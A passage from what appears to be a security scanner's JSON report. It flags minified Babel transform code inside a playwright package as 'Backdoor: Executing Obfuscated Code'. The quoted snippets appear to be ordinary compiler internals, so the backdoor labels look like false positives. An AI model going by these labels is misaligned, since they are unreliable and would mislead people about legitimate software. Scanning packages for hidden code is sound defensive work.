                      "text": "!0});Lf.default=void 0;var pl=class{constructor(t,r,n){this._map=new Map,this.key=void 0,this.file=void 0,this.opts=void 0,this.cwd=void 0,this.filename=void 0,this.key=r,this.file=t,this.opts=n||{},this.cwd=t.opts.cwd,this.filename=t.opts.filename}set(t,r){this._map.set(t,r)}get(t){return this._map.get(t)}availableHelper(t,r){return this.file.availableHelper(t,r)}addHelper(t){return this.file.addHelper(t)}buildCodeFrameError(t,r,n){return this.file.buildCodeFrameError(t,r,n)}};Lf.default=pl;pl.prototype.getModuleName=function(){return this.file.getModuleName()},pl.prototype.addImport=function(){this.file.addImport()}});var YI=E(Lb=>{\"use strict\";Object.defineProperty(Lb,\"__esModule\",{value:!0});Lb.default=W0e;function GI(){let e=Xr();return GI=function(){return e},e}var $0e=zc(),jb,WI={name:\"internal.blockHoist\",visitor:{Block:{exit({node:e}){e.body=KI(e.body)}},SwitchCase:{exit({node:e}){e.consequent=KI(e.consequent)}}}};function KI(e){let t=Math.pow(2,30)-1,r=!1;for(let n=0;n<e.length;n++){let s=e[n],i=HI(s);if(i>t){r=!0;break}t=i}return r?K0e(e.slice()):e}function W0e(){return jb||(jb=new $0e.default(Object.assign({},WI,{visitor:GI().default.explode(WI.visitor)}),{})),jb}function HI(e){let t=e==null?void 0:e._blockHoist;return t==null?1:t===!0?2:t}function K0e(e){let t=Object.create(null);for(let s=0;s<e.length;s++){let i=e[s],a=HI(i);(t[a]||(t[a]=[])).push(i)}let r=Object.keys(t).map(s=>+s).sort((s,i)=>i-s),n=0;for(let s of r){let i=t[s];for(let a of i)e[n++]=a}return e}});var Rb=E(Mb=>{\"use strict\";Object.defineProperty(Mb,\"__esModule\",{value:!0});Mb.default=G0e;function Mf(){let e=require(\"path\");return Mf=function(){return e},e}function G0e(e){let{filename:t,cwd:r,filenameRelative:n=typeof t==\"string\"?Mf().relative(r,t):\"unknown\",sourceType:s=\"module\",inputSourceMap:i,sourceMaps:a=!!i,sourceRoot:o=e.options.moduleRoot,sourceFileName:l=Mf().basename(n),comments:u=!0,compact:c=\"auto\"}=e.options,f=e.options,p=Object.assign({},f,{parserOpts:Object.assign({sourceType:Mf().extname(n)===\".mjs\"?\"module\":s,sourceFileName:t,plugins:[]},f.parserOpts),generatorOpts:Object.assign({filename:t,auxiliaryCommentBefore:f.auxiliaryCommentBefore,auxiliaryCommentAfter:f.auxiliaryCommentAfter,retainLines:f.retainLines,comments:u,shouldPrintComment:f.shouldPrintComment,compact:c,minified:f.minified,sourceMaps:a,sourceRoot:o,sourceFileName:l},f.generatorOpts)});for(let m of e.passes)for(let b of m)b.manipulateOptions&&b.manipulateOptions(p,p.parserOpts);return p}});var qb=E(Lt=>{\"use strict\";Object.defineProperty(Lt,\"commentRegex\",{get:function(){return/^\\s*?\\/[\\/\\*][@#]\\s+?sourceMappingURL=data:(((?:application|text)\\/json)(?:;charset=([^;,]+?)?)?)?(?:;(base64))?,(.*?)$/mg}});Object.defineProperty(Lt,\"mapFileCommentRegex\",{get:function(){return/(?:\\/\\/[@#][ \\t]+?sourceMappingURL=([^\\s'\"`]+?)[ \\t]*?$)|(?:\\/\\*[@#][ \\t]+sourceMappingURL=([^*]+?)[ \\t]*?(?:\\*\\/){1}[ \\t]*?$)/mg}});var Rf;typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?Rf=H0e:Rf=Y0e:Rf=X0e;function H0e(e){return Buffer.from(e,\"base64\").toString()}function Y0e(e){if(typeof value==\"number\")throw new TypeError(\"The value to decode must not be of type number.\");return new Buffer(e,\"base64\").toString()}function X0e(e){return decodeURIComponent(escape(atob(e)))}function J0e(e){return e.split(\",\").pop()}function z0e(e,t){var r=Lt.mapFileCommentRegex.exec(e),n=r[1]||r[2];try{var e=t(n);return e!=null&&typeof e.catch==\"function\"?e.catch(s):e}catch(i){s(i)}function s(i){throw new Error(\"An error occurred while trying to read the m",
                      "markdown": "`!0});Lf.default=void 0;var pl=class{constructor(t,r,n){this._map=new Map,this.key=void 0,this.file=void 0,this.opts=void 0,this.cwd=void 0,this.filename=void 0,this.key=r,this.file=t,this.opts=n||{},this.cwd=t.opts.cwd,this.filename=t.opts.filename}set(t,r){this._map.set(t,r)}get(t){return this._map.get(t)}availableHelper(t,r){return this.file.availableHelper(t,r)}addHelper(t){return this.file.addHelper(t)}buildCodeFrameError(t,r,n){return this.file.buildCodeFrameError(t,r,n)}};Lf.default=pl;pl.prototype.getModuleName=function(){return this.file.getModuleName()},pl.prototype.addImport=function(){this.file.addImport()}});var YI=E(Lb=>{\"use strict\";Object.defineProperty(Lb,\"__esModule\",{value:!0});Lb.default=W0e;function GI(){let e=Xr();return GI=function(){return e},e}var $0e=zc(),jb,WI={name:\"internal.blockHoist\",visitor:{Block:{exit({node:e}){e.body=KI(e.body)}},SwitchCase:{exit({node:e}){e.consequent=KI(e.consequent)}}}};function KI(e){let t=Math.pow(2,30)-1,r=!1;for(let n=0;n<e.length;n++){let s=e[n],i=HI(s);if(i>t){r=!0;break}t=i}return r?K0e(e.slice()):e}function W0e(){return jb||(jb=new $0e.default(Object.assign({},WI,{visitor:GI().default.explode(WI.visitor)}),{})),jb}function HI(e){let t=e==null?void 0:e._blockHoist;return t==null?1:t===!0?2:t}function K0e(e){let t=Object.create(null);for(let s=0;s<e.length;s++){let i=e[s],a=HI(i);(t[a]||(t[a]=[])).push(i)}let r=Object.keys(t).map(s=>+s).sort((s,i)=>i-s),n=0;for(let s of r){let i=t[s];for(let a of i)e[n++]=a}return e}});var Rb=E(Mb=>{\"use strict\";Object.defineProperty(Mb,\"__esModule\",{value:!0});Mb.default=G0e;function Mf(){let e=require(\"path\");return Mf=function(){return e},e}function G0e(e){let{filename:t,cwd:r,filenameRelative:n=typeof t==\"string\"?Mf().relative(r,t):\"unknown\",sourceType:s=\"module\",inputSourceMap:i,sourceMaps:a=!!i,sourceRoot:o=e.options.moduleRoot,sourceFileName:l=Mf().basename(n),comments:u=!0,compact:c=\"auto\"}=e.options,f=e.options,p=Object.assign({},f,{parserOpts:Object.assign({sourceType:Mf().extname(n)===\".mjs\"?\"module\":s,sourceFileName:t,plugins:[]},f.parserOpts),generatorOpts:Object.assign({filename:t,auxiliaryCommentBefore:f.auxiliaryCommentBefore,auxiliaryCommentAfter:f.auxiliaryCommentAfter,retainLines:f.retainLines,comments:u,shouldPrintComment:f.shouldPrintComment,compact:c,minified:f.minified,sourceMaps:a,sourceRoot:o,sourceFileName:l},f.generatorOpts)});for(let m of e.passes)for(let b of m)b.manipulateOptions&&b.manipulateOptions(p,p.parserOpts);return p}});var qb=E(Lt=>{\"use strict\";Object.defineProperty(Lt,\"commentRegex\",{get:function(){return/^\\s*?\\/[\\/\\*][@#]\\s+?sourceMappingURL=data:(((?:application|text)\\/json)(?:;charset=([^;,]+?)?)?)?(?:;(base64))?,(.*?)$/mg}});Object.defineProperty(Lt,\"mapFileCommentRegex\",{get:function(){return/(?:\\/\\/[@#][ \\t]+?sourceMappingURL=([^\\s'\"`]+?)[ \\t]*?$)|(?:\\/\\*[@#][ \\t]+sourceMappingURL=([^*]+?)[ \\t]*?(?:\\*\\/){1}[ \\t]*?$)/mg}});var Rf;typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?Rf=H0e:Rf=Y0e:Rf=X0e;function H0e(e){return Buffer.from(e,\"base64\").toString()}function Y0e(e){if(typeof value==\"number\")throw new TypeError(\"The value to decode must not be of type number.\");return new Buffer(e,\"base64\").toString()}function X0e(e){return decodeURIComponent(escape(atob(e)))}function J0e(e){return e.split(\",\").pop()}function z0e(e,t){var r=Lt.mapFileCommentRegex.exec(e),n=r[1]||r[2];try{var e=t(n);return e!=null&&typeof e.catch==\"function\"?e.catch(s):e}catch(i){s(i)}function s(i){throw new Error(\"An error occurred while trying to read the m`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 1382,
                  "endLine": 31,
                  "endColumn": 3940,
                  "snippet": {
                    "text": "is.isNodeType(\"Expression\")&&zie(t)&&!this.canHaveVariableDeclarationOrExpression()&&!this.canSwapBetweenExpressionAndStatement(t))return this.replaceExpressionWithStatements([t]);let n=this.node;return n&&(Gie(t,n),Zie(n)),this._replaceWith(t),this.type=t.type,this.setScope(),this.requeue(),[r?this.get(r):this]}function iae(e){var t;if(!this.container)throw new ReferenceError(\"Container is falsy\");this.inList?gA(this.parent,this.key,[e]):gA(this.parent,this.key,e),this.debug(`Replace with ${e==null?void 0:e.type}`),(t=(0,bA.getCachedPaths)(this.hub,this.parent))==null||t.set(e,this).delete(this.node),this.node=this.container[this.key]=e}function aae(e){this.resync();let t=[],r=zu(e,t);if(r){for(let p of t)this.scope.push({id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(u.set(\"async\",!0),f||this.replaceWith(Lie(this.node))),f&&(u.set(\"generator\",!0),this.replaceWith(tae(this.node,!0))),u.get(\"body.body\")}function zu(e,t){let r=[],n=!0;for(let s of e)if(mA(s)||(n=!1),vA(s))r.push(s);else if(Yie(s))r.push(s.expression);else if(Qie(s)){if(s.kind!==\"var\")return;for(let i of s.declarations){let a=Vie(i);for(let o of Object.keys(a))t.push($y(a[o]));i.init&&r.push(EA(\"=\",i.id,i.init))}n=!0}else if(Xie(s)){let i=s.consequent?zu([s.consequent],t):Uy(),a=s.alternate?zu([s.alternate],t):Uy();if(!i||!a)return;r.push(qie(s.test,i,a))}else if(Hie(s)){let i=zu(s.body,t);if(!i)return;r.push(i)}else if(mA(s))e.indexOf(s)===0&&(n=!0);else return;return n&&r.push(Uy()),r.length===1?r[0]:eae(r)}function oae(e){if(this.resync(),Array.isArray(e))if(Array.isArray(this.container)){e=this._verifyNodeList(e);let t=this._containerInsertAfter(e);return this.remove(),t}else return this.replaceWithMultiple(e);else return this.replaceWith(e)}});var AA=E(Qu=>{\"use strict\";Object.defineProperty(Qu,\"__esModule\",{value:!0});Qu.evaluate=mae;Qu.evaluateTruthy=dae;var lae=[\"Number\",\"String\",\"Math\"],uae=[\"isFinite\",\"isNaN\",\"parseFloat\",\"parseInt\",\"decodeURI\",\"decodeURIComponent\",\"encodeURI\",\"encodeURIComponent\",null,null],cae=[\"random\"];function SA(e){return lae.includes(e)}function fae(e){return uae.includes(e)}function pae(e){return cae.includes(e)}function dae(){let e=this.evaluate();if(e.confident)return!!e.value}function Ln(e,t){t.confident&&(t.deoptPath=",
                    "rendered": {
                      "text": "is.isNodeType(\"Expression\")&&zie(t)&&!this.canHaveVariableDeclarationOrExpression()&&!this.canSwapBetweenExpressionAndStatement(t))return this.replaceExpressionWithStatements([t]);let n=this.node;return n&&(Gie(t,n),Zie(n)),this._replaceWith(t),this.type=t.type,this.setScope(),this.requeue(),[r?this.get(r):this]}function iae(e){var t;if(!this.container)throw new ReferenceError(\"Container is falsy\");this.inList?gA(this.parent,this.key,[e]):gA(this.parent,this.key,e),this.debug(`Replace with ${e==null?void 0:e.type}`),(t=(0,bA.getCachedPaths)(this.hub,this.parent))==null||t.set(e,this).delete(this.node),this.node=this.container[this.key]=e}function aae(e){this.resync();let t=[],r=zu(e,t);if(r){for(let p of t)this.scope.push({id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(u.set(\"async\",!0),f||this.replaceWith(Lie(this.node))),f&&(u.set(\"generator\",!0),this.replaceWith(tae(this.node,!0))),u.get(\"body.body\")}function zu(e,t){let r=[],n=!0;for(let s of e)if(mA(s)||(n=!1),vA(s))r.push(s);else if(Yie(s))r.push(s.expression);else if(Qie(s)){if(s.kind!==\"var\")return;for(let i of s.declarations){let a=Vie(i);for(let o of Object.keys(a))t.push($y(a[o]));i.init&&r.push(EA(\"=\",i.id,i.init))}n=!0}else if(Xie(s)){let i=s.consequent?zu([s.consequent],t):Uy(),a=s.alternate?zu([s.alternate],t):Uy();if(!i||!a)return;r.push(qie(s.test,i,a))}else if(Hie(s)){let i=zu(s.body,t);if(!i)return;r.push(i)}else if(mA(s))e.indexOf(s)===0&&(n=!0);else return;return n&&r.push(Uy()),r.length===1?r[0]:eae(r)}function oae(e){if(this.resync(),Array.isArray(e))if(Array.isArray(this.container)){e=this._verifyNodeList(e);let t=this._containerInsertAfter(e);return this.remove(),t}else return this.replaceWithMultiple(e);else return this.replaceWith(e)}});var AA=E(Qu=>{\"use strict\";Object.defineProperty(Qu,\"__esModule\",{value:!0});Qu.evaluate=mae;Qu.evaluateTruthy=dae;var lae=[\"Number\",\"String\",\"Math\"],uae=[\"isFinite\",\"isNaN\",\"parseFloat\",\"parseInt\",\"decodeURI\",\"decodeURIComponent\",\"encodeURI\",\"encodeURIComponent\",null,null],cae=[\"random\"];function SA(e){return lae.includes(e)}function fae(e){return uae.includes(e)}function pae(e){return cae.includes(e)}function dae(){let e=this.evaluate();if(e.confident)return!!e.value}function Ln(e,t){t.confident&&(t.deoptPath=",
                      "markdown": "`is.isNodeType(\"Expression\")&&zie(t)&&!this.canHaveVariableDeclarationOrExpression()&&!this.canSwapBetweenExpressionAndStatement(t))return this.replaceExpressionWithStatements([t]);let n=this.node;return n&&(Gie(t,n),Zie(n)),this._replaceWith(t),this.type=t.type,this.setScope(),this.requeue(),[r?this.get(r):this]}function iae(e){var t;if(!this.container)throw new ReferenceError(\"Container is falsy\");this.inList?gA(this.parent,this.key,[e]):gA(this.parent,this.key,e),this.debug(`Replace with ${e==null?void 0:e.type}`),(t=(0,bA.getCachedPaths)(this.hub,this.parent))==null||t.set(e,this).delete(this.node),this.node=this.container[this.key]=e}function aae(e){this.resync();let t=[],r=zu(e,t);if(r){for(let p of t)this.scope.push({id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(u.set(\"async\",!0),f||this.replaceWith(Lie(this.node))),f&&(u.set(\"generator\",!0),this.replaceWith(tae(this.node,!0))),u.get(\"body.body\")}function zu(e,t){let r=[],n=!0;for(let s of e)if(mA(s)||(n=!1),vA(s))r.push(s);else if(Yie(s))r.push(s.expression);else if(Qie(s)){if(s.kind!==\"var\")return;for(let i of s.declarations){let a=Vie(i);for(let o of Object.keys(a))t.push($y(a[o]));i.init&&r.push(EA(\"=\",i.id,i.init))}n=!0}else if(Xie(s)){let i=s.consequent?zu([s.consequent],t):Uy(),a=s.alternate?zu([s.alternate],t):Uy();if(!i||!a)return;r.push(qie(s.test,i,a))}else if(Hie(s)){let i=zu(s.body,t);if(!i)return;r.push(i)}else if(mA(s))e.indexOf(s)===0&&(n=!0);else return;return n&&r.push(Uy()),r.length===1?r[0]:eae(r)}function oae(e){if(this.resync(),Array.isArray(e))if(Array.isArray(this.container)){e=this._verifyNodeList(e);let t=this._containerInsertAfter(e);return this.remove(),t}else return this.replaceWithMultiple(e);else return this.replaceWith(e)}});var AA=E(Qu=>{\"use strict\";Object.defineProperty(Qu,\"__esModule\",{value:!0});Qu.evaluate=mae;Qu.evaluateTruthy=dae;var lae=[\"Number\",\"String\",\"Math\"],uae=[\"isFinite\",\"isNaN\",\"parseFloat\",\"parseInt\",\"decodeURI\",\"decodeURIComponent\",\"encodeURI\",\"encodeURIComponent\",null,null],cae=[\"random\"];function SA(e){return lae.includes(e)}function fae(e){return uae.includes(e)}function pae(e){return cae.includes(e)}function dae(){let e=this.evaluate();if(e.confident)return!!e.value}function Ln(e,t){t.confident&&(t.deoptPath=`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 689,
                  "endLine": 12,
                  "endColumn": 61799,
                  "snippet": {
                    "text": "sm,exportNamedDeclaration:cS,exportSpecifier:fS,identifier:im,variableDeclaration:nY,variableDeclarator:sY}=rY;function iY(e){if(!e.isExportDeclaration()||e.isExportAllDeclaration())throw new Error(\"Only default and named export declarations can be split.\");if(e.isExportDefaultDeclaration()){let i=e.get(\"declaration\"),a=i.isFunctionDeclaration()||i.isClassDeclaration(),o=i.isFunctionExpression()||i.isClassExpression(),l=i.isScope()?i.scope.parent:i.scope,u=i.node.id,c=!1;u?o&&l.hasBinding(u.name)&&(c=!0,u=l.generateUidIdentifier(u.name)):(c=!0,u=l.generateUidIdentifier(\"default\"),(a||o)&&(i.node.id=sm(u)));let f=a?i.node:nY(\"var\",[sY(sm(u),i.node)]),p=cS(null,[fS(sm(u),im(\"default\"))]);return e.insertAfter(p),e.replaceWith(f),c&&l.registerDeclaration(e),e}else if(e.get(\"specifiers\").length>0)throw new Error(\"It doesn't make sense to split exported specifiers.\");let t=e.get(\"declaration\"),r=t.getOuterBindingIdentifiers(),n=Object.keys(r).map(i=>fS(im(i),im(i))),s=cS(null,n);return e.insertAfter(s),e.replaceWith(t.node),e}});var cs=E(Ri=>{\"use strict\";Object.defineProperty(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButComputedKey=function(t){t.skip(),t.node.computed&&t.context.maybeQueue(t.get(\"key\"))};function om(e){let{context:t,node:r}=e;if(r.computed&&t.maybeQueue(e.get(\"key\")),r.decorators)for(let n of e.get(\"decorators\"))t.maybeQueue(n)}var aY={FunctionParent(e){e.isArrowFunctionExpression()||(e.skip(),e.isMethod()&&om(e))},Property(e){e.isObjectProperty()||(e.skip(),om(e))}},oY=aY;Ri.default=oY});var pS=E(uu=>{\"use strict\";Object.defineProperty(uu,\"__esModule\",{value:!0});uu.default=void 0;var lY=no(),uY=De(),cY=cs(),fY=cu(),pY=ro(),dY={ReferencedIdentifier({node:e},t){e.name===t.oldName&&(e.name=t.newName)},Scope(e,t){e.scope.bindingIdentifierEquals(t.oldName,t.binding.identifier)||(e.skip(),e.isMethod()&&(0,cY.requeueComputedKeyAndDecorators)(e))},ObjectProperty({node:e,scope:t},r){let{name:n}=e.key;if(e.shorthand&&(n===r.oldName||n===r.newName)&&t.getBindingIdentifier(n)===r.binding.identifier){var s;e.shorthand=!1,(s=e.extra)!=null&&s.shorthand&&(e.extra.shorthand=!1)}},\"AssignmentExpression|Declaration|VariableDeclarator\"(e,t){if(e.isVariableDeclaration())return;let r=e.getOuterBindingIdentifiers();for(let n in r)n===t.oldName&&(r[n].name=t.newName)}},lm=class{constructor(t,r,n){this.newName=n,this.oldName=r,this.binding=t}maybeConvertFromExportDeclaration(t){let r=t.parentPath;if(r.isExportDeclaration()){if(r.isExportDefaultDeclaration()){let{declaration:n}=r.node;if(uY.isDeclaration(n)&&!n.id)return}r.isExportAllDeclaration()||(0,lY.default)(r)}}maybeConvertFromClassFunctionDeclaration(t){return t}maybeConvertFromClassFunctionExpression(t){return t}rename(){let{binding:t,oldName:r,newName:n}=this,{scope:s,path:i}=t,a=i.find(l=>l.isDeclaration()||l.isFunctionExpression()||l.isClassExpression());a&&a.getOuterBindingIdentifiers()[r]===t.identifier&&this.maybeConvertFromExportDeclaration(a);let o=arguments[0]||s.block;(0,fY.traverseNode)(o,(0,pY.explode)(dY),s,this,s.path,{discriminant:!0}),arguments[0]||(s.removeOwnBinding(r),s.bindings[n]=t,this.binding.identifier.name=n),a&&(this.maybeConvertFromClassFunctionDeclaration(i),this.maybeConvertFromClassFunctionExpression(i))}};uu.default=lm});var dS=E(fu=>{\"use strict\";Object.defineProperty(fu,\"__esModule\",{value:!0});fu.default=void 0;var um=class{constructor({identifier:t,scope:r,path:n,kind:s}){this.identifier=void 0,this.scope=void 0,this.path=void 0,this.kind=void 0,this.constantViolations=[],this.constant=!0,this.referencePaths=[],this.referenced=!1,this.references=0,this.identifier=t,this.scope=r,this.path=n,this.kind=s,(s===\"var\"||s===\"hoisted\")&&hY(n)&&this.reassign(n),this.clearValue()}deoptValue(){this.clearValue(),this.hasDeoptedValue=!0}setValue(t){this.hasDeoptedValue||(this.hasValue=!0,this.value=t)}clearValue(){this.hasDeoptedValue=!1,this.hasValue=!1,this.value=null}reassign(t){this.constant=!1,this.constantViolations.indexOf(t)===-1&&this.constantViolations.push(t)}reference(t){this.referencePaths.indexOf(t)===-1&&(this.referenced=!0,this.references++,this.referencePaths.push(t))}dereference(){this.references--,this.referenced=!!this.references}};fu.default=um;function hY(e){for(let{parentPath:t,key:r}=e;t;{parentPath:t,key:r}=t){if(t.isFunctionParent())return!1;if(t.isWhile()||t.isForXStatement()||t.isForStatement()&&r===\"body\")return!0}return!1}});var hS=E((SCe,mY)=>{mY.exports={builtin:{Array:!1,ArrayBuffer:!1,Atomics:!1,BigInt:!1,BigInt64Array:!1,BigUint64Array:!1,Boolean:!1,constructor:!1,DataView:!1,Date:!1,decodeURI:!1,decodeURIComponent:!1,encodeURI:!1,encodeURIComponent:!1,Error:!1,escape:!1,eval:!1,EvalError:!1,Float32Array:!1,Float64Array:!1,Function:!1,globalThis:!1,hasOwnProperty:!1,Infinity:!1,Int16Array:!1,Int32Array:!1,Int8Array:!1,isFinite:!1,isNaN:!1,isPrototypeOf:!1,JSON:!1,Map:!1,Math:!1,NaN:!1,Number:!1,Object:!1,parseFloat:!1,parseInt:!1,Promise:!1,propertyIsEnumerable:!1,Proxy:!1,RangeError:!1,ReferenceError:!1,Reflect:!1,RegExp:!1,Set:!1,SharedArrayBuffer:!1,String:!1,Symbol:!1,SyntaxError:!1,toLocaleString:!1,toString:!1,TypeError:!1,Uint16Array:!1,Uint32Array:!1,Uint8Array:!1,Uint8ClampedArray:!1,undefined:!1,unescape:!1,URIError:!1,valueOf:!1,WeakMap:!1,WeakSet:!1},es5:{Array:!1,Boolean:!1,constructor:!1,Date:!1,decodeURI:!1,decodeURIComponent:!1,encodeURI:!1,encodeURIComponent:!1,Error:!1,escape:!1,eval:!1,EvalError:!1,Function:!1,hasOwnProperty:!1,Infinity:!1,isFinite:!1,isNaN:!1,isPrototypeOf:!1,JSON:!1,Math:!1,NaN:!1,Number:!1,Object:!1,parseFloat:!1,parseInt:!1,propertyIsEnumerable:!1,RangeError:!1,ReferenceError:!1,RegExp:!1,String:!1,SyntaxError:!1,toLocaleString:!1,toString:!1,TypeError:!1,undefined:!1,unescape:!1,URIError:!1,valueOf:!1},es2015:{Array:!1,ArrayBuffer:!1,Boolean:!1,constructor:!1,DataView:!1,Date:!1,decodeURI:!1,decodeURIComponent:!1,encodeURI:!1,encodeURIComponent:!1,Error:!1,escape:!1,eval:!1,EvalError:!1,Float32Array:!1,Float64Array:!1,Function:!1,hasOwnProperty:!1,Infinity:!1,Int16Array:!1,Int32Array:!1,Int8Array:!1,isFinite:!1,isNaN:!1,isPrototypeOf:!1,JSON:!1,Map:!1,Math:!1,NaN:!1,Number:!1,Object:!1,parseFloat:!1,parseInt:!1,Promise:!1,propertyIsEnumerable:!1,Proxy:!1,RangeError:!1,ReferenceError:!1,Reflect:!1,RegExp:!1,Set:!1,String:!1,Symbol:!1,SyntaxError:!1,toLocaleString:!1,toString:!1,TypeError:!1,Uint16Array:!1,Uint32Array:!1,Uint8Array:!1,Uint8ClampedArray:!1,undefined:!1,unescape:!1,URIError:!1,valueOf:!1,WeakMap:!1,WeakSet:!1},es2017:{Array:!1,ArrayBuffer:!1,Atomics:!1,Boolean:!1,constructor:!1,DataView:!1,Date:!1,decodeURI:!1,decodeURIComponent:!1,encodeURI:!1,encodeURIComponent:!1,Error:!1,escape:!1,eval:!1,EvalError:!1,Float32Array:!1,Float64Array:!1,Function:!1,hasOwnProperty:!1,Infinity:!1,Int16Array:!1,Int32Array:!1,Int8Array:!1,isFinite:!1,isNaN:!1,isPrototypeOf:!1,JSON:!1,Map:!1,Math:!1,NaN:!1,Number:!1,Object:!1,parseFloat:!1,parseInt:!1,Promise:!1,propertyIsEnumerable:!1,Proxy:!1,RangeError:!1,ReferenceError:!1,Reflect:!1,RegExp:!1,Set:!1,SharedArrayBuffer:!1,String:!1,Symbol:!1,SyntaxError:!1,toLocaleString:!1,toString:!1,TypeError:!1,Uint16Array:!1,Uint32Array:!1,Uint8Array:!1,Uint8ClampedArray:!1,undefined:!1,unescape:!1,URIError:!1,valueOf:!1,WeakMap:!1,WeakSet:!1},browser:{AbortController:!1,AbortSignal:!1,addEventListener:!1,alert:!1,AnalyserNode:!1,Animation:!1,AnimationEffectReadOnly:!1,AnimationEffectTiming:!1,AnimationEffectTimingReadOnly:!1,AnimationEvent:!1,AnimationPlaybackEvent:!1,AnimationTimeline:!1,applicationCache:!1,ApplicationCache:!1,ApplicationCacheErrorEvent:!1,atob:!1,Attr:!1,Audio:!1,AudioBuffer:!1,AudioBufferSourceNode:!1,AudioContext:!1,AudioDestinationNode:!1,AudioListener:!1,AudioNode:!1,AudioParam:!1,AudioProcessingEvent:!1,AudioScheduledSourceNode:!1,\"AudioWorkletGlobalScope \":!1,AudioWorkletNode:!1,AudioWorkletProcessor:!1,BarProp:!1,BaseAudioContext:!1,BatteryManager:!1,BeforeUnloadEvent:!1,BiquadFilterNode:!1,Blob:!1,BlobEvent:!1,blur:!1,BroadcastChannel:!1,btoa:!1,BudgetService:!1,ByteLengthQueuingStrategy:!1,Cache:!1,caches:!1,CacheStorage:!1,cancelAnimationFrame:!1,cancelIdleCallback:!1,CanvasCaptureMediaStreamTrack:!1,CanvasGradient:!1,CanvasPattern:!1,CanvasRenderingContext2D:!1,ChannelMergerNode:!1,ChannelSplitterNode:!1,CharacterData:!1,clearInterval:!1,clearTimeout:!1,clientInformation:!1,ClipboardEvent:!1,close:!1,closed:!1,CloseEvent:!1,Comment:!1,CompositionEvent:!1,confirm:!1,console:!1,ConstantSourceNode:!1,ConvolverNode:!1,CountQueuingStrategy:!1,createImageBitmap:!1,Credential:!1,CredentialsContainer:!1,crypto:!1,Crypto:!1,CryptoKey:!1,CSS:!1,CSSConditionRule:!1,CSSFontFaceRule:!1,CSSGroupingRule:!1,CSSImportRule:!1,CSSKeyframeRule:!1,CSSKeyframesRule:!1,CSSMediaRule:!1,CSSNamespaceRule:!1,CSSPageRule:!1,CSSRule:!1,CSSRuleList:!1,CSSStyleDeclaration:!1,CSSStyleRule:!1,CSSStyleSheet:!1,CSSSupportsRule:!1,CustomElementRegistry:!1,customElements:!1,CustomEvent:!1,DataTransfer:!1,DataTransferItem:!1,DataTransferItemList:!1,defaultstatu